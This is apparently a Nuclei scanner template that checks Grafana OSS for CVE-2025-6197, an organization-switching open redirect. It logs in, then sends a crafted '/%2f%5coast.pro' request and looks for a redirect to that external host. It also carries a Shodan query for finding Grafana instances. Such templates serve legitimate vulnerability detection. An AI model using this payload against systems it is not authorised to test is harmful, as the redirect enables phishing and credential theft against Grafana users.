flow: http(1) && http(2)
http:
- extractors:
  - dsl:
    - username
    - password
    type: dsl
  matchers:
  - part: body
    type: word
    words:
    - Logged in
  - part: header
    type: word
    words:
    - grafana_session
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    accept: application/json, text/plain, */*

    DNT: 1

    content-type: application/json

    Origin: {{RootURL}}

    Referer: {{RootURL}}/login

    Cookie: redirect_to=%2F


    {"user":"{{username}}","password":"{{password}}"}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(location, '//\oast.pro?')
    name: open-redirect
    type: dsl
  raw:
  - 'GET /%2f%5coast.pro?orgId={{orgid}} HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
id: CVE-2025-6197
info:
  author: iamnoooob,pdresearch
  description: 'An open redirect vulnerability has been identified in Grafana OSS
    organization switching functionality. Prerequisites for exploitation Multiple
    organizations must exist in the Grafana instance - Victim must be on a different
    organization than the one specified in the URL

    '
  impact: 'Authenticated attackers can redirect users to arbitrary external domains
    through organization switching functionality, enabling phishing attacks and credential
    theft.

    '
  metadata:
    max-request: 2
    shodan-query: html:"grafana"
    verified: true
  name: Open Redirect via Organization Switching
  reference:
  - https://grafana.com/blog/2025/07/17/grafana-security-release-medium-and-high-severity-fixes-for-cve-2025-6197-and-cve-2025-6023/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-6197
  remediation: 'Upgrade Grafana OSS to the latest version that properly validates
    redirect URLs in organization switching functionality.

    '
  severity: medium
  tags: cve,cve2025,redirect,grafana,open-redirect,vuln
variables:
  orgid: '{{orgid}}'
  password: '{{password}}'
  username: '{{username}}'
